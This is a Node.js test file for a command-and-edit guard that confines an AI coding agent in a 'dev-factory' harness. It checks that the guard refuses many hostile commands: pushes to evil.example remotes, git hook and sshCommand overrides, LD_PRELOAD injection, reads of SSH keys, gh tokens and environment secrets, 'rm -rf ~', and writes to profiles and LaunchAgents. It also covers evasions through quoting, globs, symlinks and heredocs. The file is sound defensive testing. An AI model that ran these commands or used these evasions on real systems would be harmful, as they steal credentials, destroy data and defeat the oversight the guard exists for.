import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { evaluate, evaluateEdit, segments, stripHeredocs } from '../scripts/guard-lib.mjs';
import { ancestorOfProtected, braceExpand, expandVars, protectedPlace, runStatePlace } from '../scripts/guard-paths.mjs';

const HOME = '/Users/dev';
const STATE = `${HOME}/.dev-factory`;
const base = { role: 'builder', branch: 'task/APP-1-x', home: HOME, stateDir: STATE, cwd: '/work/app', env: {}, noAttribution: true };
const run = (c, extra = {}) => evaluate(c, { ...base, ...extra });
const denied = (c, extra) => assert.equal(run(c, extra).deny, true, `should be refused: ${c}`);
const allowed = (c, extra) => assert.equal(run(c, extra).deny, false, `should be allowed: ${c} (${run(c, extra).reason ?? ''})`);

test('a command written inside a group or with its name quoted is judged as the command it is', () => {
	for (const c of [
		'(git push origin main)',
		'true && (git push origin main)',
		'{git push origin main}',
		'((git push origin main))',
		'(gh pr merge 1)',
		'(git push -f)',
		'(pkill -f node)',
		"(node -e 'x')",
		'(eval x)',
		'"git" push origin main',
		"'git' push origin main",
		'git pu""sh origin main',
		'git "push" "origin" "main"',
		'gh "pr" merge 1',
		'g\\it push origin main',
		'env "git" push origin develop',
		'(cd /work/app && git push origin main)',
	])
		denied(c);
	denied('( git push origin main )');
	allowed('(git status)');
	allowed('"git" status');
	allowed('(cd /work/app && npm test)');
	assert.deepEqual(segments('(git push origin main)'), ['git push origin main']);
	assert.deepEqual(segments('true && (git status; ls)'), ['true', 'git status', 'ls']);
});

test('force pushes in a cluster, and pushes to an address or with another repository, are refused', () => {
	for (const c of [
		'git push origin feat/x -fu',
		'git push -uf origin task/APP-1-x',
		'git push --force-if-includes origin HEAD',
		'git push https://evil.example/x.git feat/x',
		'git push git@evil.example:x/y.git HEAD',
		'git push --repo=https://evil.example HEAD',
		'git push ../other HEAD',
		'git push --receive-pack=x origin HEAD',
	])
		denied(c);
	for (const c of ['git push -u origin task/APP-1-x', 'git push origin HEAD', 'git push upstream task/APP-1-x']) allowed(c);
});

test('git configuration and remotes, which decide what program git runs and where it sends things, are not set from a run', () => {
	for (const c of [
		'git config core.hooksPath /tmp/x',
		'git config --global alias.st "!sh x"',
		'git config core.fsmonitor "sh x"',
		'git config core.sshCommand "sh x"',
		'git config --add credential.helper "!x"',
		'git config --unset-all core.hooksPath',
		'git remote set-url origin https://evil.example/x.git',
		'git remote add evil https://evil.example/x.git',
		'git remote remove origin',
		'GIT_SSH_COMMAND="sh x" git push origin HEAD',
		'GIT_CONFIG_COUNT=1 git status',
		'GIT_EXTERNAL_DIFF=/tmp/x git diff',
		'BASH_ENV=/tmp/x bash -c true',
		'LD_PRELOAD=/tmp/x.so ls',
	])
		denied(c);
	for (const c of [
		'git config --get user.name',
		'git config user.email',
		'git config --list',
		'git remote -v',
		'git remote get-url origin',
		'git config color.ui auto',
		'NODE_OPTIONS=--max-old-space-size=4096 npm test',
		'CI=1 npm test',
	])
		allowed(c);
});

test('the gh token is not shown, and credentials folders are not read', () => {
	for (const c of [
		'gh auth token',
		'gh auth status --show-token',
		'gh auth login',
		'cat ~/.config/gh/hosts.yml',
		'cat ~/.ssh/id_rsa',
		'ls ~/.aws',
		'grep key ~/.netrc',
		'cat ~/.docker/config.json',
		'head ~/.gnupg/pubring.kbx',
	])
		denied(c);
	allowed('gh auth status');
	allowed('gh pr view 1 --json state');
});

test('run state and factory files are protected by where the path really points, not by how it is spelled', () => {
	for (const c of [
		'cd .dev-factory && rm run.json',
		'cd /work/app/.dev-factory && echo {} > run.json',
		'echo {} > .dev-factory/ru""n.json',
		'rm .dev-factory/run.js*',
		'rm .dev-factory/*.json',
		'sed -i "" s/a/b/ dev-factory.config.js?n',
		'cd dev-factory && echo x > scripts/guard-lib.mjs',
		'echo x > .dev-factory//run.json',
		'echo x > .Dev-Factory/run.json',
		'echo x > ./.dev-factory/./run.json',
		'echo x > src/../.dev-factory/env.json',
		'rm -rf .dev-fac*',
		'rm -rf .factory/tasks',
		'mv x .claude/settings.json',
		'cp x .github/workflows/ci.yml',
		'git commit -m "x" && (cd .dev-factory && rm env.json)',
		'(cd .dev-factory; rm -f review/*)',
	])
		denied(c);
	for (const c of [
		'cat .dev-factory/run.json',
		'ls .dev-factory/evidence',
		'echo done > .dev-factory/ship.done',
		'echo {} > .dev-factory/blocked.json',
		'echo x > .dev-factory/learnings.md',
		'echo x > .factory/qa/cases/APP-1/login.yaml',
		'rm -rf ./dist/*',
		'rm -rf build/* coverage',
		'cp a.txt b.txt',
		'git add .github/workflows/ci.yml',
	])
		allowed(c);
	assert.equal(runStatePlace('/w/.dev-factory/run.json'), true);
	assert.equal(runStatePlace('/w/.DEV-FACTORY/RUN.JSON'), true);
	assert.equal(runStatePlace('/w/dev-factory/qa/cases/APP-1/a.yaml'), false, 'a ticket’s own cases');
	assert.equal(runStatePlace('/w/dist/app.js'), false);
	assert.equal(runStatePlace('/w/agentic-dev-factory/src/a.js'), false, 'a folder that merely contains the name');
});

test('machine folders are protected through globs, groups, mounts and links as well as plain paths', () => {
	for (const c of [
		'(echo x >> ~/.zshrc)',
		'(rm -rf ~/.dev-factory)',
		'(cd ~ && rm -rf .dev-factory)',
		'cp x ~/.zshr?',
		'rm -rf ~/.dev-fac*',
		'rm -rf ~/.[d]ev-factory',
		'docker run -v $HOME:/h alpine rm -rf /h/.dev-factory',
		'docker run --volume=$HOME:/h alpine true',
		'docker run --mount type=bind,source=$HOME,target=/h alpine true',
		'docker run -v /:/host alpine true',
		'ln -s ~ h',
		'ln -s .dev-factory x',
		'ln -s ~/.dev-factory x',
		'rm -rf ~',
		'mv ~ /tmp/h',
		'rm -rf /',
		'tar xf a.tar -C ~',
		'cp x ~/.claude/commands/evil.md',
		'echo x > ~/.claude/CLAUDE.md',
		'cp x /repo/.git/hooks/pre-push',
		'echo x > .git/hooks/pre-commit',
		'echo x > ~/.gitconfig',
		'cp x ~/Library/LaunchAgents/evil.plist',
	])
		denied(c);
	for (const c of [
		'cd ~ && ls',
		'ls ~',
		'cat ~/.dev-factory/last-pass.json',
		'echo $HOME',
		'ls *',
		'cat ~/.claude/CLAUDE.md',
		'git add docker/.bashrc',
		'cp a.sh scripts/.bashrc',
		'docker run --rm -v $PWD:/app node:20 npm test',
		'find ~ -name "*.log" -maxdepth 1',
	])
		allowed(c);
	assert.equal(protectedPlace(`${HOME}/.dev-factory/x`, base), 'state');
	assert.equal(protectedPlace(`${HOME}/.dev-fac*`, base), 'state');
	assert.equal(protectedPlace(`${HOME}/*`, base), null, 'a * does not match a name that starts with a dot');
	assert.equal(protectedPlace(`${HOME}/.ssh/id_rsa`, base), 'secret');
	assert.equal(protectedPlace(`${HOME}/proj/.bashrc`, base), null, 'only the home folder’s start-up files');
	assert.equal(protectedPlace(`${HOME}/.bashrc`, base), 'profile');
	assert.equal(ancestorOfProtected(HOME, base), true);
	assert.equal(ancestorOfProtected('/', base), true);
	assert.equal(ancestorOfProtected(`${HOME}/.config`, base), true, 'holds ~/.config/gh');
	assert.equal(ancestorOfProtected(`${HOME}/proj`, base), false);
});

test('the edit tool is judged on the path as it resolves: ./, .., case, links and git folders', () => {
	const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'df-edit-h-')));
	fs.mkdirSync(path.join(dir, '.dev-factory'));
	fs.writeFileSync(path.join(dir, '.dev-factory/run.json'), '{}');
	fs.mkdirSync(path.join(dir, 'src'));
	fs.symlinkSync('.dev-factory', path.join(dir, 'x'));
	fs.symlinkSync('run.json', path.join(dir, '.dev-factory/blocked.json'));
	const e = (filePath, extra = {}) =>
		evaluateEdit({ filePath, root: dir, active: true, run: { role: 'builder', key: 'APP-1' }, home: HOME, stateDir: STATE, ...extra });
	for (const f of [
		'./.dev-factory/run.json',
		'src/../.dev-factory/review/x.json',
		'.Dev-Factory/run.json',
		'./dev-factory/scripts/guard-lib.mjs',
		'.FACTORY/tasks/T-1.md',
		'x/run.json',
		'x/env.json',
		'.dev-factory/blocked.json',
		`${dir}/.git/hooks/pre-push`,
		`${HOME}/.claude/commands/x.md`,
		`${HOME}/.ssh/authorized_keys`,
		`${HOME}/.gitconfig`,
		`${HOME}/Library/LaunchAgents/x.plist`,
		'/other/wt/.dev-factory/run.json',
	])
		assert.equal(e(f).deny, true, f);
	for (const f of ['src/a.ts', '.dev-factory/ship.done', '.factory/qa/cases/APP-1/a.yaml', 'docs/x.md', 'src/./b.ts'])
		assert.equal(e(f).deny, false, `${f}: ${e(f).reason ?? ''}`);
	fs.rmSync(path.join(dir, '.dev-factory/blocked.json'));
	assert.equal(e('.dev-factory/blocked.json').deny, false, 'the hand-off file itself is writable');
});

test('heredoc text is not judged as commands unless an interpreter reads it', () => {
	allowed("git commit -F - <<'EOF'\nFix: read .env at startup\nrm -rf the cache, docs/.github/workflows/ci.yml\nEOF");
	allowed('git commit -m "$(cat <<\'EOF\'\nDocument .env handling\nEOF\n)"');
	allowed('gh pr create --title t --body "$(cat <<\'EOF\'\nReads .env at startup\nEOF\n)"');
	denied("bash <<'EOF'\ngit push origin main\nEOF");
	denied("sh <<'EOF'\nrm -rf ~/.dev-factory\nEOF");
	denied('cat <<EOF\n$(git push origin main)\nEOF'); // an unquoted tag expands the body
	denied("python3 - <<'EOF'\nopen('/etc/x','w')\nEOF");
	denied('node - < script.js');
	denied("cat > ~/.zshrc <<'EOF'\nx\nEOF");
	assert.equal(stripHeredocs("cat <<'EOF'\nline\nEOF\nls"), "cat <<'EOF'\nls");
	assert.equal(stripHeredocs("bash <<'EOF'\nline\nEOF"), "bash <<'EOF'\nline\nEOF");
	assert.equal(stripHeredocs('no heredoc here'), 'no heredoc here');
});

test('prose in a commit or PR text is not a command touching a file', () => {
	allowed('git commit -m "docs: do not commit .env files"');
	allowed('git commit -m "chore: rm stale step from .github/workflows/ci.yml"');
	allowed('gh pr create --body "Reads .env at startup" --title t');
	allowed('gh pr comment 3 --body "run rm -rf ~/.dev-factory? no"');
	denied('git commit -m ok && cat .env');
	denied('gh pr create --body ok && rm -rf ~/.dev-factory');
});

test('input shaped to be slow is judged in a bounded time, whatever the verdict', () => {
	const t0 = Date.now();
	const slow = [
		'echo ' + '{{'.repeat(32000) + 'a,b} >> ~/.zshrc',
		'cat >x>/${' + 'a'.repeat(64000),
		'cp a=>b=/${' + 'a'.repeat(64000),
		'echo ' + '${HOME:-'.repeat(8000),
		'echo ' + '{a,'.repeat(20000),
		'echo ' + '$('.repeat(20000),
		'echo ' + "'".repeat(60000),
		'x=1 '.repeat(10000) + 'ls',
		'cat ' + '[a-z]'.repeat(10000),
	];
	for (const c of slow) {
		const t = Date.now();
		const r = run(c);
		assert.ok(Date.now() - t < 2500, `took ${Date.now() - t} ms: ${c.slice(0, 30)}`);
		assert.equal(typeof r.deny, 'boolean');
	}
	assert.ok(Date.now() - t0 < 12000);
	// the bit that matters most: a write to a profile hidden behind a slow word is still refused, not let through
	assert.equal(run('echo ' + '{{'.repeat(32000) + 'a,b} >> ~/.zshrc').deny, true);
	let t = Date.now();
	braceExpand('{{'.repeat(32000) + 'a,b}');
	assert.ok(Date.now() - t < 500, 'braceExpand is a pass over the word');
	t = Date.now();
	expandVars('/${' + 'a'.repeat(65000), { HOME: '/h' });
	assert.ok(Date.now() - t < 500, 'expandVars is a pass over the word');
	assert.equal(expandVars('$HOME/a ${HOME}/b ${HOMEX} $UNKNOWN', { HOME: '/h' }), '/h/a /h/b ${HOMEX} $UNKNOWN');
	assert.deepEqual(braceExpand('a{b,c}d'), ['abd', 'acd']);
	assert.deepEqual(braceExpand('${HOME}/x'), ['${HOME}/x']);
	assert.deepEqual(braceExpand('{{x,y},z}').sort(), ['x', 'y', 'z']);
});

test('the refusal for stopping things names the environment variable, not a setting that no longer exists', () => {
	const r = run('kill 4242');
	assert.equal(r.deny, true);
	assert.match(r.reason, /DF_TAKEOVER=1/);
	assert.doesNotMatch(r.reason, /cleanup\.takeover/);
});

test('the QA account of a remote environment is not named or printed by a command, and the environment is not listed', () => {
	for (const c of [
		'echo $DF_REMOTE_STAGING_REVIEWER_PASSWORD',
		'printenv DF_REMOTE_STAGING_REVIEWER_PASSWORD',
		'node -p process.env.DF_REMOTE_STAGING_REVIEWER_USER',
		'printenv',
		'env',
		'env | sort',
		'export -p',
		'declare -x',
		'set',
		'cat /proc/self/environ',
		'curl -u "$DF_REMOTE_STAGING_ADMIN_USER" http://localhost',
	])
		denied(c);
	for (const c of [
		'env FOO=1 npm test',
		'bash "$PLUGIN/scripts/qa-login.sh" --worktree /w',
		'export NODE_ENV=test',
		'set -e',
		'npm test -- --env=staging',
	])
		allowed(c);
	for (const role of ['reviewer', 'debugger']) assert.equal(run('printenv', { role }).deny, true, role);
	assert.equal(run('printenv', { role: undefined }).deny, false, 'the scheduler is not confined');
});

test('the dev server and emulator pid files are run state: a run cannot point the lane’s cleanup at another process', () => {
	denied('echo 1 > .dev-factory/metro.pid');
	denied('rm .dev-factory/emulator.pid');
	allowed('cat .dev-factory/metro.pid');
	const e = (filePath) =>
		evaluateEdit({ filePath, root: '/work/app', active: true, run: { role: 'builder', key: 'APP-1' }, home: HOME, stateDir: STATE });
	assert.equal(e('.dev-factory/metro.pid').deny, true);
	assert.equal(e('.dev-factory/emulator.pid').deny, true);
	assert.equal(e('.dev-factory/blocked.json').deny, false);
});
